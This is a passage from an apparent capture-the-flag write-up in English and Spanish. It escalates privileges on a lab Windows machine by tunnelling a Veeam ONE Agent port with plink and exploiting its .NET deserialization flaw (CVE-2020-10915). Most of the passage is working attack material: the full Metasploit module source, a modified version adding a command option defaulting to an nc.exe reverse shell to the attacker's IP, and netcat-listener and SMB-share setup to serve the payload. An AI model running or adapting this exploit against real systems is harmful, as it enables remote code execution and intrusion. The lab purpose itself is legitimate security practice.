+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       852
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1340
+  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       772
+  TCP    10.10.242.97:139       0.0.0.0:0              LISTENING       4
+  TCP    10.10.242.97:2805      10.10.242.97:49719     ESTABLISHED     5060
+  TCP    10.10.242.97:5985      10.8.19.103:53348      TIME_WAIT       0
+  TCP    10.10.242.97:5985      10.8.19.103:53364      ESTABLISHED     4
+  TCP    10.10.242.97:49719     10.10.242.97:2805      ESTABLISHED     5060
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Documents> Get-Process -Id 5060
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    744      53    54720      74028              5060   0 Veeam.One.Agent.Service
+
+Veeam One Agent Service es un servicio de Windows que forma parte de la solución de backup y recuperación de datos de Veeam. Su función es recopilar información sobre el estado de los servidores y dispositivos de almacenamiento en un entorno de TI y enviar esa información a Veeam ONE Server para su análisis. Esto permite a los administradores de TI monitorear el estado de sus servidores y dispositivos de almacenamiento y tomar medidas preventivas para evitar problemas de disponibilidad.
+
+El servicio Veeam One Agent Service se inicia automáticamente cada vez que se inicia la computadora y se ejecuta en segundo plano, sin interferir con el rendimiento del sistema. Si necesitas detener el servicio, puedes hacerlo desde el Administrador de tareas de Windows o desde el panel de control de Veeam ONE.
+
+https://www.veeam.com/
+
+https://www.veeam.com/kb3144
+
+https://www.rapid7.com/db/modules/exploit/windows/misc/veeam_one_agent_deserialization/
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Documents> Get-ChildItem C:\ -recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "Veeam.One.Agent"}
+
+    Directory: C:\Program Files\Veeam\Veeam ONE
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/7/2020   7:57 AM                Veeam ONE Agent
+
+    Directory: C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/18/2019   7:50 PM         453560 Veeam.One.Agent.Common.dll
+-a----        1/18/2019   7:50 PM          22968 Veeam.One.Agent.Configurator.PowerShell.dll
+-a----        1/18/2019   7:50 PM          57784 Veeam.One.Agent.Controller.PowerShell.dll
+-a----        1/18/2019   7:50 PM          89528 Veeam.One.Agent.Deployment.Common.dll
+-a----        1/18/2019   7:50 PM         445880 Veeam.One.Agent.Deployment.Service.exe
+-a----        1/18/2019   7:50 PM         311736 Veeam.One.Agent.Service.exe
+-a----        1/18/2019   7:50 PM          50616 Veeam.One.Agent.Updater.exe
+
+Evil-WinRM* PS C:\Users\MichelleWat\Documents> Get-Item 'C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe' | Format-List *
+
+PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe
+PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent
+PSChildName       : Veeam.One.Agent.Service.exe
+PSDrive           : C
+PSProvider        : Microsoft.PowerShell.Core\FileSystem
+PSIsContainer     : False
+Mode              : -a----
+VersionInfo       : File:             C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe
+                    InternalName:     Veeam.One.Agent.Service.exe
+                    OriginalFilename: Veeam.One.Agent.Service.exe
+                    FileVersion:      9.5.4.4566
+                    FileDescription:  OneAgent
+                    Product:          Veeam ONE Monitor
+                    ProductVersion:   9.5.4.4566
+                    Debug:            False
+                    Patched:          False
+                    PreRelease:       False
+                    PrivateBuild:     False
+                    SpecialBuild:     False
+                    Language:         Language Neutral
+
+BaseName          : Veeam.One.Agent.Service
+Target            : {}
+LinkType          :
+Name              : Veeam.One.Agent.Service.exe
+Length            : 311736
+DirectoryName     : C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent
+Directory         : C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent
+IsReadOnly        : False
+Exists            : True
+FullName          : C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe
+Extension         : .exe
+CreationTime      : 1/18/2019 7:50:50 PM
+CreationTimeUtc   : 1/19/2019 3:50:50 AM
+LastAccessTime    : 6/7/2020 7:57:03 AM
+LastAccessTimeUtc : 6/7/2020 2:57:03 PM
+LastWriteTime     : 1/18/2019 7:50:50 PM
+LastWriteTimeUtc  : 1/19/2019 3:50:50 AM
+Attributes        : Archive
+
+  ProductVersion:   9.5.4.456
+
+The port 2805 was inaccessible from the outside world. I had to get access to the port from the attacker’s machine.
+
+https://informationsecurity.medium.com/remote-ssh-tunneling-with-plink-exe-7831072b3d7d
+
+https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+
+download (64-bit x86)
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cp plink.exe ../Set
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd ../Set
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ ls
+CVE-2021-1675.ps1  hook.lnk  Info.txt   users_final.txt  winPEASany_ofs.exe
+hash_michelle      hook.zip  plink.exe  users.xml
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ chmod +x plink.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.242.97 - - [02/Jan/2023 14:35:08] "GET /plink.exe HTTP/1.1" 200 -
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Documents> Invoke-WebRequest -Uri http://10.8.19.103:1337/plink.exe -outfile plink.exe
+*Evil-WinRM* PS C:\Users\MichelleWat\Documents> ls
+
+    Directory: C:\Users\MichelleWat\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         1/2/2023  11:35 AM         986928 plink.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ sudo service ssh start
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Documents> echo y|& ./plink.exe -l kali -pw kali -N -R 2805:127.0.0.1:280
+5 10.8.19.103
+plink.exe : Using username "kali".
+    + CategoryInfo          : NotSpecified: (Using username "kali".:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ nmap -p2805 localhost
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 15:10 EST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.0016s latency).
+Other addresses for localhost (not scanned): ::1
+
+PORT     STATE SERVICE
+2805/tcp open  wta-wsp-s
+
+Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
+
+metasploit
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ msfconsole -q
+```
+```text
+msf6 > searchsploit veeam
+[*] exec: searchsploit veeam
+
+---------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                              |  Path
+---------------------------------------------------------------------------- ---------------------------------
+Veeam ONE Reporter 9.5.0.3201 - Multiple Cross-Site Request Forgery         | ashx/webapps/46765.txt
+Veeam ONE Reporter 9.5.0.3201 - Persistent Cross-Site Scripting             | ashx/webapps/46766.txt
+Veeam ONE Reporter 9.5.0.3201 - Persistent Cross-site Scripting (Add/Edit W | ashx/webapps/46767.txt
+---------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+```text
+msf6 > search veeam
+
+Matching Modules
+================
+```
+```text
+#  Name                                                  Disclosure Date  Rank    Check  Description
+   -  ----                                                  ---------------  ----    -----  -----------
+   0  exploit/windows/misc/veeam_one_agent_deserialization  2020-04-15       normal  Yes    Veeam ONE Agent .NET Deserialization
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/veeam_one_agent_deserialization
+```
+```text
+msf6 > use 0
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > show options
+
+Module options (exploit/windows/misc/veeam_one_agent_deserialization):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   HOSTINFO_NAME  AgentController  yes       Name to send in host info (must be recognized by server!)
+   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-fr
+                                             amework/wiki/Using-Metasploit
+   RPORT          2805             yes       The target port (TCP)
+   SRVHOST        0.0.0.0          yes       The local host or network interface to listen on. This must be
+                                             an address on the local machine or 0.0.0.0 to listen on all add
+                                             resses.
+   SRVPORT        8080             yes       The local port to listen on.
+   SSL            false            no        Negotiate SSL for incoming connections
+   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated
+                                             )
+   URIPATH                         no        The URI to use for this exploit (default is random)
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   PowerShell Stager
+
+View the full module info with the info, or info -d command.
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set SRVHOST 10.8.19.103
+SRVHOST => 10.8.19.103
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set LHOST 10.8.19.103
+LHOST => 10.8.19.103
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > run
+
+[*] Started reverse TCP handler on 10.8.19.103:4444 
+[*] 127.0.0.1:2805 - Connecting to 127.0.0.1:2805
+[*] 127.0.0.1:2805 - Sending host info to 127.0.0.1:2805
+[*] 127.0.0.1:2805 - Executing PowerShell Stager for windows/x64/meterpreter/reverse_tcp
+[*] 127.0.0.1:2805 - Sending malicious handshake to 127.0.0.1:2805
+[*] Exploit completed, but no session was created.
+
+https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/misc/veeam_one_agent_deserialization
+
+ashh
+
+Veeam ONE Agent .NET Deserialization es una vulnerabilidad de seguridad que afecta al servicio Veeam One Agent Service. Esta vulnerabilidad permite que un atacante remoto envíe datos maliciosos a través del servicio y ejecute código malintencionado en la máquina vulnerable.
+
+Para explotar esta vulnerabilidad, el atacante debe enviar un paquete de datos malicioso a través del servicio Veeam One Agent Service utilizando técnicas de inyección de código. Una vez que el paquete de datos es recibido por el servicio, se deserializan y se ejecuta el código malintencionado incluido en el paquete.
+
+Para evitar esta vulnerabilidad, es importante mantener el servicio Veeam One Agent Service y todas las aplicaciones relacionadas actualizadas con las últimas parches de seguridad. También es recomendable utilizar medidas de seguridad adicionales, como firewalls y sistemas de detección y prevención de intrusiones (IDS/IPS), para proteger la red contra ataques externos.
+
+None of the 3 payloads in the module works, because Defender is killing them!
+
+Here we can modify :)
+```
+```text
+┌──(kali㉿kali)-[/usr/share/metasploit-framework/modules/auxiliary]
+└─$ locate veeam_one_agent_deserialization
+/usr/share/doc/metasploit-framework/modules/exploit/windows/misc/veeam_one_agent_deserialization.md
+/usr/share/metasploit-framework/modules/exploits/windows/misc/veeam_one_agent_deserialization.rb
+```
+```text
+┌──(kali㉿kali)-[/usr/share/metasploit-framework/modules/auxiliary]
+└─$ cd /usr/share/metasploit-framework/modules/exploits/windows/misc/
+```
+```text
+┌──(kali㉿kali)-[/usr/…/modules/exploits/windows/misc]
+└─$ ls                                    
+achat_bof.rb                                     hp_magentservice.rb
+actfax_raw_server_bof.rb                         hp_omniinet_1.rb
+agentxpp_receive_agentx.rb                       hp_omniinet_2.rb
+ahsay_backup_fileupload.rb                       hp_omniinet_3.rb
+ais_esel_server_rce.rb                           hp_omniinet_4.rb
+allmediaserver_bof.rb                            hp_operations_agent_coda_34.rb
+altiris_ds_sqli.rb                               hp_operations_agent_coda_8c.rb
+apple_quicktime_rtsp_response.rb                 hp_ovtrace.rb
+asus_dpcproxy_overflow.rb                        hta_server.rb
+avaya_winpmd_unihostrouter.rb                    ib_isc_attach_database.rb
+avidphoneticindexer.rb                           ib_isc_create_database.rb
+bakbone_netvault_heap.rb                         ibm_cognos_tm1admsd_bof.rb
+bcaaa_bof.rb                                     ibm_director_cim_dllinject.rb
+bigant_server_250.rb                             ibm_tsm_cad_ping.rb
+bigant_server_dupf_upload.rb                     ibm_tsm_rca_dicugetidentify.rb
+bigant_server.rb                                 ibm_websphere_java_deserialize.rb
+bigant_server_sch_dupf_bof.rb                    ib_svc_attach.rb
+bigant_server_usv.rb                             itunes_extm3u_bof.rb
+bomberclone_overflow.rb                          landesk_aolnsrvr.rb
+bopup_comm.rb                                    lianja_db_net.rb
+borland_interbase.rb                             manageengine_eventlog_analyzer_rce.rb
+borland_starteam.rb                              mercury_phonebook.rb
+citrix_streamprocess_data_msg.rb                 mini_stream.rb
+citrix_streamprocess_get_boot_record_request.rb  mirc_privmsg_server.rb
+citrix_streamprocess_get_footer.rb               mobile_mouse_rce.rb
+citrix_streamprocess_get_objects.rb              ms07_064_sami.rb
+citrix_streamprocess.rb                          ms10_104_sharepoint.rb
+cloudme_sync.rb                                  netcat110_nt.rb
+commvault_cmd_exec.rb                            nettransport.rb
+crosschex_device_bof.rb                          nvidia_mental_ray.rb
+cve_2022_28381_allmediaserver_bof.rb             plugx.rb
+disk_savvy_adm.rb                                poisonivy_21x_bof.rb
+doubletake.rb                                    poisonivy_bof.rb
+eiqnetworks_esa.rb                               poppeeper_date.rb
+eiqnetworks_esa_topology.rb                      poppeeper_uidl.rb
+enterasys_netsight_syslog_bof.rb                 realtek_playlist.rb
+eureka_mail_err.rb                               remote_control_collection_rce.rb
+fb_cnct_group.rb                                 remote_mouse_rce.rb
+fb_isc_attach_database.rb                        sap_2005_license.rb
+fb_isc_create_database.rb                        sap_netweaver_dispatcher.rb
+fb_svc_attach.rb                                 shixxnote_font.rb
+gh0st.rb                                         solidworks_workgroup_pdmwservice_file_write.rb
+gimp_script_fu.rb                                splayer_content_type.rb
+hp_dataprotector_cmd_exec.rb                     stream_down_bof.rb
+hp_dataprotector_crs.rb                          talkative_response.rb
+hp_dataprotector_dtbclslogin.rb                  tiny_identd_overflow.rb
+hp_dataprotector_encrypted_comms.rb              trendmicro_cmdprocessor_addtask.rb
+hp_dataprotector_exec_bar.rb                     ufo_ai.rb
+hp_dataprotector_install_service.rb              unified_remote_rce.rb
+hp_dataprotector_new_folder.rb                   veeam_one_agent_deserialization.rb
+hp_dataprotector_traversal.rb                    vmhgfs_webdav_dll_sideload.rb
+hp_imc_dbman_restartdb_unauth_rce.rb             webdav_delivery.rb
+hp_imc_dbman_restoredbase_unauth_rce.rb          wifi_mouse_rce.rb
+hp_imc_uam.rb                                    windows_rsh.rb
+hp_loadrunner_magentproc_cmdexec.rb              wireshark_lua.rb
+hp_loadrunner_magentproc.rb                      wireshark_packet_dect.rb
+```
+```text
+┌──(kali㉿kali)-[/usr/…/modules/exploits/windows/misc]
+└─$ cat veeam_one_agent_deserialization.rb                           
+##
+```
+```text
+# This module requires Metasploit: https://metasploit.com/download
+```
+```text
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Veeam ONE Agent .NET Deserialization',
+        'Description' => %q{
+          This module exploits a .NET deserialization vulnerability in the Veeam
+          ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the
+          9 and 10 release lines.
+
+          Specifically, the module targets the HandshakeResult() method used by
+          the Agent. By inducing a failure in the handshake, the Agent will
+          deserialize untrusted data.
+
+          Tested against the pre-patched release of 10.0.0.750. Note that Veeam
+          continues to distribute this version but with the patch pre-applied.
+        },
+        'Author' => [
+          'Michael Zanetta', # Discovery
+          'Edgar Boda-Majer', # Discovery
+          'wvu' # Module
+        ],
+        'References' => [
+          ['CVE', '2020-10914'],
+          ['CVE', '2020-10915'], # This module
+          ['ZDI', '20-545'],
+          ['ZDI', '20-546'], # This module
+          ['URL', 'https://www.veeam.com/kb3144']
+        ],
+        'DisclosureDate' => '2020-04-15', # Vendor advisory
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
+        'Privileged' => false,
+        'Targets' => [
+          [
+            'Windows Command',
+            {
+              'Arch' => ARCH_CMD,
+              'Type' => :win_cmd,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
+              }
+            }
+          ],
+          [
+            'Windows Dropper',
+            {
+              'Arch' => [ARCH_X86, ARCH_X64],
+              'Type' => :win_dropper,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'
+              }
+            }
+          ],
+          [
+            'PowerShell Stager',
+            {
+              'Arch' => [ARCH_X86, ARCH_X64],
+              'Type' => :psh_stager,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
+              }
+            }
+          ]
+        ],
+        'DefaultTarget' => 2,
+        'DefaultOptions' => {
+          'WfsDelay' => 10
+        },
+        'Notes' => {
+          'Stability' => [SERVICE_RESOURCE_LOSS], # Connection queue may fill?
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        }
+      )
+    )
+
+    register_options([
+      Opt::RPORT(2805),
+      OptString.new(
+        'HOSTINFO_NAME',
+        [
+          true,
+          'Name to send in host info (must be recognized by server!)',
+          'AgentController'
+        ]
+      )
+    ])
+  end
+
+  def check
+    vprint_status("Checking connection to #{peer}")
+    connect
+
+    CheckCode::Detected("Connected to #{peer}.")
+  rescue Rex::ConnectionError => e
+    CheckCode::Unknown("#{e.class}: #{e.message}")
+  ensure
+    disconnect
+  end
+
+  def exploit
+    print_status("Connecting to #{peer}")
+    connect
+
+    print_status("Sending host info to #{peer}")
+    sock.put(host_info(datastore['HOSTINFO_NAME']))
+
+    res = sock.get_once
+    vprint_good("<-- Host info reply: #{res.inspect}") if res
+
+    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
+
+    case target['Type']
+    when :win_cmd
+      execute_command(payload.encoded)
+    when :win_dropper
+```
+```text
+# TODO: Create an option to execute the full stager without hacking
+```
+```text
+# :linemax or calling execute_command(generate_cmdstager(...).join(...))
+      execute_cmdstager(
+        flavor: :psh_invokewebrequest, # NOTE: This requires PowerShell >= 3.0
+        linemax: 9001 # It's over 9000
+      )
+    when :psh_stager
+      execute_command(cmd_psh_payload(
+        payload.encoded,
+        payload.arch.first,
+        remove_comspec: true
+      ))
+    end
+  rescue EOFError, Rex::ConnectionError => e
+    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
+  ensure
+    disconnect
+  end
+
+  def execute_command(cmd, _opts = {})
+    vprint_status("Executing command: #{cmd}")
+
+    serialized_payload = Msf::Util::DotNetDeserialization.generate(
+      cmd,
+      gadget_chain: :TextFormattingRunProperties,
+      formatter: :BinaryFormatter # This is _exactly_ what we need
+    )
+
+    print_status("Sending malicious handshake to #{peer}")
+    sock.put(handshake(serialized_payload))
+
+    res = sock.get_once
+    vprint_good("<-- Handshake reply: #{res.inspect}") if res
+  rescue EOFError, Rex::ConnectionError => e
+    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
+  end
+
+  def host_info(name)
+    meta = [0x0205].pack('v')
+    packed_name = [name.length].pack('C') + name
+
+    pkt = meta + packed_name
+
+    vprint_good("--> Host info packet: #{pkt.inspect}")
+    pkt
+  end
+
+  def handshake(serialized_payload)
+```
+```text
+# A -1 status indicates a failure, which will trigger the deserialization
+    status = [-1].pack('l<')
+
+    length = status.length + serialized_payload.length
+    type = 7
+    attrs = 1
+    kontext = 0
+
+    header = [length, type, attrs, kontext].pack('VvVV')
+    padding = "\x00" * 18
+    result = status + serialized_payload
+
+    pkt = header + padding + result
+
+    vprint_good("--> Handshake packet: #{pkt.inspect}")
+    pkt
+  end
+
+end
+
+https://vulners.com/metasploit/MSF:EXPLOIT-WINDOWS-MISC-VEEAM_ONE_AGENT_DESERIALIZATION-
+
+https://www.welivesecurity.com/la-es/2014/10/17/como-crear-primer-modulo-metasploit/
+
+https://www.pinguytaz.net/index.php/2019/07/13/creando-un-modulo-metasploit/
+
+and finally will be like:
+```
+```text
+┌──(kali㉿kali)-[/usr/…/modules/exploits/windows/misc]
+└─$ cat veeam_one_agent_deserialization.rb
+##
+```
+```text
+# This module requires Metasploit: https://metasploit.com/download
+```
+```text
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Veeam ONE Agent .NET Deserialization',
+        'Description' => %q{
+          This module exploits a .NET deserialization vulnerability in the Veeam
+          ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the
+          9 and 10 release lines.
+
+          Specifically, the module targets the HandshakeResult() method used by
+          the Agent. By inducing a failure in the handshake, the Agent will
+          deserialize untrusted data.
+
+          Tested against the pre-patched release of 10.0.0.750. Note that Veeam
+          continues to distribute this version but with the patch pre-applied.
+        },
+        'Author' => [
+          'Michael Zanetta', # Discovery
+          'Edgar Boda-Majer', # Discovery
+          'wvu' # Module
+        ],
+        'References' => [
+          ['CVE', '2020-10914'],
+          ['CVE', '2020-10915'], # This module
+          ['ZDI', '20-545'],
+          ['ZDI', '20-546'], # This module
+          ['URL', 'https://www.veeam.com/kb3144']
+        ],
+        'DisclosureDate' => '2020-04-15', # Vendor advisory
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
+        'Privileged' => false,
+        'Targets' => [
+          [
+            'Windows Command',
+            {
+              'Arch' => ARCH_CMD,
+              'Type' => :win_cmd,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
+              }
+            }
+          ],
+          [
+            'Windows Dropper',
+            {
+              'Arch' => [ARCH_X86, ARCH_X64],
+              'Type' => :win_dropper,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'
+              }
+            }
+          ],
+          [
+            'PowerShell Stager',
+            {
+              'Arch' => [ARCH_X86, ARCH_X64],
+              'Type' => :psh_stager,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
+              }
+            }
+          ],
+          [
+            'Windows Set Command',
+            {
+              'Arch' => ARCH_CMD,
+              'Type' => :win_cmd1,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'windows/x64/exec'
+              }
+            }
+          ]
+        ],
+        'DefaultTarget' => 2,
+        'DefaultOptions' => {
+          'WfsDelay' => 10
+        },
+        'Notes' => {
+          'Stability' => [SERVICE_RESOURCE_LOSS], # Connection queue may fill?
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        }
+      )
+    )
+
+    register_options([
+      Opt::RPORT(2805),
+      OptString.new(
+        'CMD',
+        [
+          true,
+          'Command to be executed on the target',
+          'nc.exe 10.8.10.103 4444 -e cmd'
+        ]
+      ),
+      OptString.new(
+        'HOSTINFO_NAME',
+        [
+          true,
+          'Name to send in host info (must be recognized by server!)',
+          'AgentController'
+        ]
+      )
+    ])
+  end
+
+  def check
+    vprint_status("Checking connection to #{peer}")
+    connect
+
+    CheckCode::Detected("Connected to #{peer}.")
+  rescue Rex::ConnectionError => e
+    CheckCode::Unknown("#{e.class}: #{e.message}")
+  ensure
+    disconnect
+  end
+
+  def exploit
+    print_status("Connecting to #{peer}")
+    connect
+
+    print_status("Sending host info to #{peer}")
+    sock.put(host_info(datastore['HOSTINFO_NAME']))
+
+    res = sock.get_once
+    vprint_good("<-- Host info reply: #{res.inspect}") if res
+
+    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
+
+    case target['Type']
+    when :win_cmd1
+      execute_command(datastore['CMD'])
+    when :win_cmd
+      execute_command(payload.encoded)
+    when :win_dropper
+```
+```text
+# TODO: Create an option to execute the full stager without hacking
+```
+```text
+# :linemax or calling execute_command(generate_cmdstager(...).join(...))
+      execute_cmdstager(
+        flavor: :psh_invokewebrequest, # NOTE: This requires PowerShell >= 3.0
+        linemax: 9001 # It's over 9000
+      )
+    when :psh_stager
+      execute_command(cmd_psh_payload(
+        payload.encoded,
+        payload.arch.first,
+        remove_comspec: true
+      ))
+    end
+  rescue EOFError, Rex::ConnectionError => e
+    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
+  ensure
+    disconnect
+  end
+
+  def execute_command(cmd, _opts = {})
+    vprint_status("Executing command: #{cmd}")
+
+    serialized_payload = Msf::Util::DotNetDeserialization.generate(
+      cmd,
+      gadget_chain: :TextFormattingRunProperties,
+      formatter: :BinaryFormatter # This is _exactly_ what we need
+    )
+
+    print_status("Sending malicious handshake to #{peer}")
+    sock.put(handshake(serialized_payload))
+
+    res = sock.get_once
+    vprint_good("<-- Handshake reply: #{res.inspect}") if res
+  rescue EOFError, Rex::ConnectionError => e
+    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
+  end
+
+  def host_info(name)
+    meta = [0x0205].pack('v')
+    packed_name = [name.length].pack('C') + name
+
+    pkt = meta + packed_name
+
+    vprint_good("--> Host info packet: #{pkt.inspect}")
+    pkt
+  end
+
+  def handshake(serialized_payload)
+```
+```text
+# A -1 status indicates a failure, which will trigger the deserialization
+    status = [-1].pack('l<')
+
+    length = status.length + serialized_payload.length
+    type = 7
+    attrs = 1
+    kontext = 0
+
+    header = [length, type, attrs, kontext].pack('VvVV')
+    padding = "\x00" * 18
+    result = status + serialized_payload
+
+    pkt = header + padding + result
+
+    vprint_good("--> Handshake packet: #{pkt.inspect}")
+    pkt
+  end
+
+end
+
+La línea `when :win_cmd1` es parte de una estructura de control de flujo condicional, en este caso una estructura `case`. La línea `execute_command(datastore['CMD'])` es una llamada a una función o método que ejecuta un comando en la consola del sistema operativo. La variable `datastore` es un diccionario o hashmap que almacena valores que se pueden utilizar en el contexto del script. En este caso, se está obteniendo el valor del elemento `CMD` del diccionario y se está pasando como parámetro a la función `execute_command`.
+
+Es posible que este código forme parte de un script de Metasploit, una herramienta de seguridad que se utiliza para realizar pruebas de penetración y explotación de vulnerabilidades en sistemas y aplicaciones. En este caso, la estructura `case` puede utilizarse para determinar qué acción realizar en función del valor de una variable. Al ejecutar la función `execute_command` con el valor del elemento `CMD` del diccionario `datastore`, se estaría ejecutando el comando especificado por el usuario en la consola del sistema operativo.
+
+es correcto
+
+privesc
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ locate nc.exe      
+/home/kali/Downloads/steel_mountain/nc.exe
+/home/kali/ra2/nc.exe
+/usr/lib/mono/4.5/cert-sync.exe
+/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+/usr/share/windows-resources/binaries/nc.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ cp /home/kali/ra2/nc.exe nc.exe
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lnvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ sudo smbserver.py -smb2support -username me -password me share .
+[sudo] password for kali: 
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ msfconsole -q
+```
+```text
+msf6 > search veeam
+
+Matching Modules
+================
+```
+```text
+#  Name                                                  Disclosure Date  Rank    Check  Description
+   -  ----                                                  ---------------  ----    -----  -----------
+   0  exploit/windows/misc/veeam_one_agent_deserialization  2020-04-15       normal  Yes    Veeam ONE Agent .NET Deserialization
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/veeam_one_agent_deserialization
+```
+```text
+msf6 > use 0
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > show options
+
+Module options (exploit/windows/misc/veeam_one_agent_deserialization):
+
+   Name           Current Setting               Required  Description
+   ----           ---------------               --------  -----------
+   CMD            nc.exe 10.8.19.103 4444 -e   yes       Command to be executed on the target
+                  cmd
+   HOSTINFO_NAME  AgentController               yes       Name to send in host info (must be recognized by s
+                                                          erver!)
+   RHOSTS                                       yes       The target host(s), see https://github.com/rapid7/
+                                                          metasploit-framework/wiki/Using-Metasploit
+   RPORT          2805                          yes       The target port (TCP)
+   SRVHOST        0.0.0.0                       yes       The local host or network interface to listen on.
+                                                          This must be an address on the local machine or 0.
+                                                          0.0.0 to listen on all addresses.
